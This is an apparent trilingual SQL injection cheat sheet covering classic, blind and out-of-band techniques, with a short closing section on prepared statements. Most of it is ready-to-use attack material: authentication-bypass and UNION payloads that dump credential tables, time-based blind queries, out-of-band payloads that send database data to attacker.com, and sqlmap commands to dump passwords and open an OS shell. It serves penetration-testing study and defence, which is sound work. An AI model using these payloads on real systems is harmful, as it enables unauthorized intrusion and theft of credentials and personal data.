## 1. 🏢 Overview — What is SQL Injection?

### 🇮🇩 Bahasa Indonesia
**SQL Injection (SQLi)** adalah kerentanan keamanan web yang terjadi ketika data input dari pengguna yang tidak divalidasi atau tidak di-escape disematkan langsung ke dalam query database SQL. Hal ini memungkinkan penyerang untuk memanipulasi logika query, membaca data sensitif (password hash, kartu kredit, PII), memodifikasi/menghapus data database, dan dalam beberapa kasus mendapatkan *Remote Code Execution (RCE)* pada server database.

### 🇬🇧 English
**SQL Injection (SQLi)** is a critical web security vulnerability that occurs when untrusted, unvalidated user input is directly concatenated into a dynamic database SQL query. This flaw allows attackers to interfere with query logic, extract confidential records (credentials, payment cards, PII), alter database state, and potentially achieve *Remote Code Execution (RCE)* on the underlying operating system.

### 🇯🇵 日本語
**SQLインジェクション（SQLi）**は、ユーザーからの未検証の入力データがSQLクエリに直接連結されることで発生する重大な脆弱性です。攻撃者はクエリロジックを改ざんし、機密データ（パスワードハッシュ、個人情報など）の漏洩、データの改ざん・削除、さらにはOS上でのリモートコード実行（RCE）を引き起こす可能性があります。

```
Vulnerable PHP Query:
$query = "SELECT * FROM users WHERE username = '" . $_POST['user'] . "' AND password = '" . $_POST['pass'] . "'";

Attacker Payload in user field:
admin' OR '1'='1' -- -

Resulting Executed Query:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- -' AND password = '...';
(Bypasses authentication successfully!)
```

## 2. ⚡ In-Band (Classic) SQL Injection

### 1. UNION-Based SQLi
Digunakan untuk mengekstrak data dari tabel lain dengan menggabungkan hasil query asli dengan hasil query buatan penyerang menggunakan operator `UNION SELECT`.
- **Syarat**: Kedua query harus memiliki **jumlah kolom yang sama** dan **tipe data yang kompatibel**.

```sql
-- Step 1: Menentukan jumlah kolom
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- - (Error -> berarti ada 2 kolom)

-- Step 2: Menentukan kolom yang mencetak output string
' UNION SELECT 'a', 'b'-- -

-- Step 3: Ekstraksi versi database dan user
' UNION SELECT @@version, user()-- -            (MySQL/MariaDB)
' UNION SELECT version(), current_user-- -      (PostgreSQL)
' UNION SELECT banner, user FROM v$version-- -  (Oracle)

-- Step 4: Dump database, tabel, dan kolom (MySQL)
' UNION SELECT group_concat(table_name), 2 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT group_concat(column_name), 2 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT group_concat(username, 0x3a, password), 2 FROM users-- -
```

### 2. Error-Based SQLi
Digunakan ketika aplikasi menampilkan pesan error database mendetail di browser. Penyerang sengaja memicu error matematis atau fungsi tertentu untuk membocorkan data di dalam pesan error.

```sql
-- MySQL Error-based via updatexml()
' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)-- -
-- Output Error: XPATH syntax error: '~root@localhost~'
```

## 3. 🕵️ Inferential (Blind) SQL Injection

### 1. Boolean-Based Blind
Aplikasi tidak menampilkan data atau error, tetapi respons HTTP berubah (misal: halaman menampilkan pesan *"Welcome"* vs *"User not found"*) berdasarkan kondisi Benar/Salah (True/False).

```sql
-- True condition (Halaman normal)
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -

-- False condition (Halaman berbeda / error)
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='b'-- -
```

### 2. Time-Based Blind
Respons HTTP sama persis untuk True dan False. Penyerang menggunakan fungsi jeda waktu (*sleep/delay*) untuk menguji kondisi.

```sql
-- MySQL: Jika huruf pertama password adalah 'a', tunda respons selama 5 detik
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', sleep(5), 0)-- -

-- PostgreSQL
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -

-- Microsoft SQL Server
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
```

## 4. 🌐 Out-of-Band (OOB) SQL Injection

Jika aplikasi sama sekali tidak memberikan respons balik langsung (Blind), penyerang memaksa database membuat koneksi jaringan DNS atau HTTP ke server yang dikontrol penyerang (misal via Burp Collaborator):

```sql
-- Oracle OOB via UTL_HTTP / UTL_INADDR
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM DUAL)) FROM DUAL-- -

-- Microsoft SQL Server OOB via master..xp_dirtree (DNS Lookup)
'; DECLARE @p varchar(1024); SET @p=(SELECT user_name()); EXEC('master..xp_dirtree "\\'+@p+'.attacker.com\foo"');-- -
```

## 5. 🛠️ SQLMap Automation Workflow

```bash
# ── BASIC SCANNING ───────────────────────────────────────────
sqlmap -u "http://target.com/product.php?id=1" --batch

# ── POST REQUEST FROM BURP SUITE CAPTURE ─────────────────────
# Save intercepted HTTP request to req.txt
sqlmap -r req.txt -p username --batch

# ── DATABASE ENUMERATION & DUMP ──────────────────────────────
sqlmap -r req.txt --dbs                         # List databases
sqlmap -r req.txt -D target_db --tables         # List tables
sqlmap -r req.txt -D target_db -T users --columns # List columns
sqlmap -r req.txt -D target_db -T users -C username,password --dump # Dump credentials

# ── OS SHELL / CODE EXECUTION (IF PRIVILEGED) ────────────────
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

## 6. 🛡️ Secure Remediation — Prepared Statements

### 🇮🇩 Bahasa Indonesia
Satu-satunya pertahanan permanen yang terbukti aman dari SQLi adalah **Prepared Statements (Parameterized Queries)**. Query dan parameter dipisahkan — database memperlakukan input pengguna murni sebagai data literal, bukan instruksi yang dapat dieksekusi.

```php
// ✅ AMAN: PDO Prepared Statement (PHP)
$stmt = $pdo->prepare('SELECT id, username, email FROM users WHERE email = :email AND status = :status');
$stmt->execute([
    'email' => $userInputEmail,
    'status' => 'active'
]);
$user = $stmt->fetch();
```
